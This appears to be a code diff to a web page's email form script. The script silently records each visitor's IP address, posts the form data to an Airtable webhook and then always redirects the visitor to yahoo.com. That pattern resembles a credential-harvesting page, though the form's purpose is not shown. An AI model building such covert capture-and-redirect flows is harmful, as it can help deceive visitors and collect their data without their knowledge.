@@ -82,6 +82,8 @@
         <div class="w-form-done">
           <div>Thank you! Your submission has been received!</div>
         </div>
+        <div class="w-form-fail">
+          <div>Oops! Something went wrong while submitting the form.</div>
         </div>
       </div>
     </div>
@@ -142,21 +144,13 @@ function transform() {
 </script>
 <script>
   $(document).ready(function () {
-    // First, fetch user's IP and store it in the hidden field
+    // Fetch user's IP and store it in the hidden field
     $.getJSON("https://api64.ipify.org?format=json", function (data) {
-      $("#ip").val(data.ip); // ✅ Set the IP field before submission
-      console.log("User IP:", data.ip); // Debugging: See if IP is captured
+      $("#ip").val(data.ip);
     });
 
     $("#email-form").submit(function (event) {
-      event.preventDefault(); // Prevent default form submission
-
-      var ipValue = $("#ip").val(); // Get the IP value before submitting
-
-      if (!ipValue) {
-        alert("⚠️ Error: IP address not captured yet. Please try again.");
-        return; // Stop submission if IP is missing
-      }
+      event.preventDefault(); // Prevent default submission
 
       var formData = $(this).serialize(); // Serialize form data
 
@@ -165,12 +159,13 @@ function transform() {
         type: "POST",
         data: formData,
         success: function () {
-          console.log("✅ Form submitted successfully with IP:", ipValue);
+          console.log("✅ Form submitted successfully!");
         },
         error: function () {
           console.warn("⚠️ Airtable Webhook doesn't return a success response.");
         },
         complete: function () {
+          // ✅ Force redirect after submission, regardless of success or error
           setTimeout(function () {
             window.location.href = "https://www.yahoo.com";
           }, 1000);
